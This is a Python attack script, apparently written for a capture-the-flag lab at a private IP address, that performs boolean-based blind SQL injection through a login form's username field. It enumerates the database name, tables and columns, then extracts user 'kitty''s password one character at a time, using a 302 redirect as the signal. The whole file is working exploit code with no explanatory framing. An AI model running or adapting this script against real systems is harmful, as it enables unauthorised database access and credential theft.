import requests

def get_data(url, chars, payload):
    pos = 1
    value = ''
    if "column_name LIKE" in payload:
        # Guessing that the column for passwords starts with 'p', otherwise will only find 'created' column
        value = 'p'
    while True:
        char_found = False
        for char in chars:
            data = {
                'username': payload.format(pos=pos, char=char, value=value),
                'password': 'a'
            }
            
            try:
                # Don't allow redirects so we can capture the 302 response    
                response = requests.post(url, data=data, allow_redirects=False)
                
                if response.status_code == 302:
                    value += char
                    pos += 1
                    char_found = True
                    break
           
            except requests.RequestException as e:
                print(f'Error sending POST request: {e}')

        if not char_found:
            return value

if __name__ == "__main__":
    url = 'http://10.10.91.232/index.php'
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#$^&()'
   
    payloads = {
        'Database': "kitty' AND SUBSTRING(database(), {pos}, 1)='{char}' -- -",
        'Table': "kitty' AND EXISTS (SELECT 1 FROM information_schema.tables WHERE table_schema = database() AND BINARY table_name LIKE '{value}{char}%') -- -",
        'Column': "kitty' AND EXISTS (SELECT 1 FROM information_schema.columns WHERE table_schema = database() AND table_name = 'siteusers' AND BINARY column_name LIKE '{value}{char}%') -- -",
        'Password': "kitty' AND EXISTS (SELECT 1 FROM information_schema.columns WHERE table_schema = database() AND table_name = 'siteusers' AND column_name = 'password' AND SUBSTRING((SELECT BINARY password FROM siteusers WHERE username = 'kitty'), {pos}, 1) = '{char}') -- -"
    }

    for key, payload in payloads.items():
        result = get_data(url, chars, payload)
        print(f'[+] {key} : {result}')
